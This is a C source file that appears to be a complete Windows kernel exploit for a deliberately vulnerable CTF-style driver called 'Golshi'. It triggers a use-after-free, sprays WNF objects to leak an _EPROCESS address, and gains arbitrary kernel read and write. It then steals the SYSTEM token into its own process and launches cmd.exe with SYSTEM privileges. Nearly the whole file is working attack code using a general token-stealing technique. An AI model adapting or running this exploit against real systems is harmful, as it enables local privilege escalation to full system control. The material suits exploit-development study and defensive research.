#include <stdio.h> 
#include <stdlib.h> 
#include <string.h>
#include <windows.h>
#include "Helper.cpp"
#include "Golshi.h"
#include "Wnf.h"

#define DRIVER "\\\\.\\Golshi"
HANDLE hDriver = NULL;

NTSTATUS Ioctl(DWORD Code, PREQUEST Req)
{
    return DeviceIoControl(
        hDriver,
        Code,
        Req,
        sizeof(REQUEST),
        NULL,
        NULL,
        NULL,
        NULL
    );
}

VOID AllocTrainer(ULONG Idx)
{
    REQUEST Req = { 0 };
    Req.TrainerIdx = Idx;
    Ioctl(IOCTL_HIRE_TRAINER, &Req);
}

VOID FreeTrainer(ULONG TrainerIdx)
{
    REQUEST Req = { 0 };
    Req.TrainerIdx = TrainerIdx;
    Ioctl(IOCTL_FORCE_RESIGN_TRAINER, &Req);
}

VOID SetTrainer(ULONG TrainerIdx, const char* Name)
{
    REQUEST Req = { 0 };
    Req.TrainerIdx = TrainerIdx;
    Req.Name = (PCHAR)Name;
    Ioctl(IOCTL_SET_TRAINER, &Req);
}

VOID GetTrainerName(ULONG TrainerIdx, PCHAR OutputBuffer, ULONG Length)
{
    REQUEST Req = { 0 };
    Req.TrainerIdx = TrainerIdx;
    Req.OutputBuffer = OutputBuffer;
    Req.Length = Length;
    Ioctl(IOCTL_GET_TRAINER_NAME, &Req);
}

VOID AllocHorse(ULONG TrainerIdx)
{
    REQUEST Req = { 0 };
    Req.TrainerIdx = TrainerIdx;
    Ioctl(IOCTL_NEW_FOAL, &Req);
}

VOID FreeHorse(ULONG TrainerIdx, ULONG HorseIdx)
{
    REQUEST Req = { 0 };
    Req.TrainerIdx = TrainerIdx;
    Req.HorseIdx = HorseIdx;
    Ioctl(IOCTL_RETIRE_STALLION, &Req);
}

VOID SetHorse(ULONG TrainerIdx, ULONG HorseIdx, const char* Name)
{
    REQUEST Req = { 0 };
    Req.TrainerIdx = TrainerIdx;
    Req.HorseIdx = HorseIdx;
    Req.Name = (PCHAR)Name;
    Ioctl(IOCTL_SET_STALLION, &Req);
}

VOID GetHorseName(ULONG TrainerIdx, ULONG HorseIdx, PCHAR OutputBuffer)
{
    REQUEST Req = { 0 };
    Req.TrainerIdx = TrainerIdx;
    Req.HorseIdx = HorseIdx;
    Req.OutputBuffer = OutputBuffer;
    Ioctl(IOCTL_GET_STALLION_NAME, &Req);
}

INT main()
{
    NTSTATUS Status;
    CHAR Buffer[0x30] = { 0x0 };
    ULONGLONG CurrentEProcess = NULL;
    ULONGLONG SystemEProcess = NULL;
    ULONGLONG SystemToken = NULL;
    WNF_STATE_NAME StateNames[SPRAY_WIDTH];
    SECURITY_DESCRIPTOR SecurityDesc = { 0 };
    InitializeSecurityDescriptor(&SecurityDesc, SECURITY_DESCRIPTOR_REVISION);

#define INITIAL_TRAINER   0 
#define GADGET_TRAINER    1
#define VICTIM_TRAINER    2

    myNtCreateWnfStateName fNtCreateWnfStateName = (myNtCreateWnfStateName)GetProcAddress(GetModuleHandleA("NTDLL.dll"), "NtCreateWnfStateName");
    myNtDeleteWnfStateName fNtDeleteWnfStateName = (myNtDeleteWnfStateName)GetProcAddress(GetModuleHandleA("NTDLL.dll"), "NtDeleteWnfStateName");
    myNtUpdateWnfStateData fNtUpdateWnfStateData = (myNtUpdateWnfStateData)GetProcAddress(GetModuleHandleA("NTDLL.dll"), "NtUpdateWnfStateData");
    myNtDeleteWnfStateData fNtDeleteWnfStateData = (myNtDeleteWnfStateData)GetProcAddress(GetModuleHandleA("NTDLL.dll"), "NtDeleteWnfStateData");
    myNtQueryWnfStateData  fNtQueryWnfStateData = (myNtQueryWnfStateData)GetProcAddress(GetModuleHandleA("NTDLL.dll"), "NtQueryWnfStateData");

    puts("opening driver handle...");
    hDriver = CreateFileA(DRIVER, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDriver == INVALID_HANDLE_VALUE)
    {
        Panic("failed to open handle to driver");
    }

    puts("[>] Allocating First Trainer");
    AllocTrainer(INITIAL_TRAINER);

    //Pause();

    puts("[>] Spraying Horses to increase Trainer size");
    for (int i = 0; i < 15; i++)
    {
        AllocHorse(INITIAL_TRAINER);
    }

    //Pause();

    puts("[>] Freeing Trainer to trigger UAF");
    FreeTrainer(INITIAL_TRAINER);

    puts("[>] Spraying WNF");
    memset(Buffer, 0x41, sizeof(Buffer) - 1);
    for (int i = 0; i <= SPRAY_WIDTH; i++)
    {
        Status = fNtCreateWnfStateName(&StateNames[i], WnfTemporaryStateName, WnfDataScopeMachine, FALSE, 0, WNF_MAX_DATA_SIZE, &SecurityDesc);
        Status = fNtUpdateWnfStateData(&StateNames[i], Buffer, (0x100), 0, 0, 0, 0);
    }

    for (int i = 0; i <= SPRAY_WIDTH; i++)
    {
        Status = fNtCreateWnfStateName(&StateNames[i], WnfTemporaryStateName, WnfDataScopeMachine, FALSE, 0, WNF_MAX_DATA_SIZE, &SecurityDesc);
        Status = fNtUpdateWnfStateData(&StateNames[i], Buffer, (0x100), 0, 0, 0, 0);
    }

    //Pause();

    puts("[>] Getting _EPROCESS");
    memset(Buffer, 0x0, sizeof(Buffer));
    GetTrainerName(INITIAL_TRAINER, Buffer, 15);
    DumpHex(Buffer, sizeof(Buffer));

    CurrentEProcess = ((PULONGLONG)Buffer)[4];
    printf("[+] _EPROCESS: %#llx\n", CurrentEProcess);

    if (((ULONG)CurrentEProcess & 0xf) != 0x0)
    {
        Panic("Invalid Pointer for EPROCESS");
    }

    // cleanup
    for (int i = 0; i <= SPRAY_WIDTH; i++)
    {
        Status = fNtDeleteWnfStateData(&StateNames[i], NULL);
    }

    puts("[>] allocating gadget trainer for spraying horses");
    AllocTrainer(GADGET_TRAINER);

    //Pause();

    puts("[>] Spraying Horses");
    for (int i = 0; i < SPRAY_WIDTH; i++)
    {
        AllocHorse(GADGET_TRAINER);
    }

    //Pause();

    puts("[>] Creating Horse Holes");
    for (int i = 0; i < SPRAY_WIDTH; i += 3)
    {
        FreeHorse(GADGET_TRAINER, i);
    }

    puts("[>] Allocating Victim Trainer");
    AllocTrainer(VICTIM_TRAINER);

    //Pause();

    puts("[>] Triggering UAF on Victim Trainer");
    FreeTrainer(VICTIM_TRAINER);

    puts("[>] Spraying Horses for Profit");
    for (int i = 0; i < SPRAY_WIDTH; i += 3)
    {
        AllocHorse(GADGET_TRAINER);
    }

    //Pause();

    puts("[>] Traversing _EPROCESS to find SYSTEM");
    ULONGLONG TempEProcess = CurrentEProcess;
    ULONGLONG TempPID = 0x0;
    while (SystemEProcess == NULL)
    {
        //puts("[>] Profiting from UAF to Arbitrary Read");
        memset(Buffer, 0x0, sizeof(Buffer));
        ((PULONGLONG)Buffer)[0] = 0x1;
        ((PULONGLONG)Buffer)[1] = TempEProcess + 0x1d8; // ActiveProcessLinks
        ((PULONGLONG)Buffer)[2] = 0x4141414141414141; // somehow this part is not copied
        ((PULONGLONG)Buffer)[2] = 0x4242424242424242;
        for (int i = 0; i < SPRAY_WIDTH; i++)

        {
            SetHorse(GADGET_TRAINER, i, Buffer);
        }

        //Pause();

        //puts("[>] Reading Blink of ActiveProcessLinks");
        memset(Buffer, 0x0, sizeof(Buffer));
        GetHorseName(VICTIM_TRAINER, 0, Buffer);
        //DumpHex(Buffer, sizeof(Buffer));

        TempEProcess = ((PULONGLONG)Buffer)[1] - 0x1d8;
        printf("[+] Found Backward _EPROCESS: %#llx\n", TempEProcess);

        //Pause();

        //puts("[>] Checking PID of the process");
        memset(Buffer, 0x0, sizeof(Buffer));
        ((PULONGLONG)Buffer)[0] = 0x1;
        ((PULONGLONG)Buffer)[1] = TempEProcess + 0x1d0;
        for (int i = 0; i < SPRAY_WIDTH; i++)
        {
            SetHorse(GADGET_TRAINER, i, Buffer);
        }
        memset(Buffer, 0x0, sizeof(Buffer));
        GetHorseName(VICTIM_TRAINER, 0, Buffer);
        //DumpHex(Buffer, sizeof(Buffer));

        TempPID = ((PULONGLONG)Buffer)[0];
        printf("[+] Found process PID: %llu\n", TempPID);

        if (TempPID == 0x4)
        {
            SystemEProcess = TempEProcess;
            printf("[+] Found SYSTEM Process: %#llx\n", SystemEProcess);
            Pause();
            break;
        }

        //puts("continue?");
        //Pause();
    }

    puts("[>] Grabbing SYSTEM Token");
    memset(Buffer, 0x0, sizeof(Buffer));
    ((PULONGLONG)Buffer)[0] = 0x1;
    ((PULONGLONG)Buffer)[1] = SystemEProcess + 0x248;
    for (int i = 0; i < SPRAY_WIDTH; i++)

    {
        SetHorse(GADGET_TRAINER, i, Buffer);
    }
    memset(Buffer, 0x0, sizeof(Buffer));
    GetHorseName(VICTIM_TRAINER, 0, Buffer);
    DumpHex(Buffer, sizeof(Buffer));

    SystemToken = ((PULONGLONG)Buffer)[0];
    printf("[+] SYSTEM Token: %#llx\n", SystemToken);

    Pause();

    puts("[>] Overwriting current process token with SYSTEM Token");
    memset(Buffer, 0x0, sizeof(Buffer));
    ((PULONGLONG)Buffer)[0] = 0x1;
    ((PULONGLONG)Buffer)[1] = CurrentEProcess + 0x248;
    for (int i = 0; i < SPRAY_WIDTH; i++)

    {
        SetHorse(GADGET_TRAINER, i, Buffer);
    }

    memset(Buffer, 0x0, sizeof(Buffer));
    ((PULONGLONG)Buffer)[0] = SystemToken;
    SetHorse(VICTIM_TRAINER, 0, Buffer);

    Pause();

    puts("[>] Spawning cmd.exe with SYSTEM Privileges");
    system("cmd.exe");

    printf("End of Exploit...");
    getchar();
}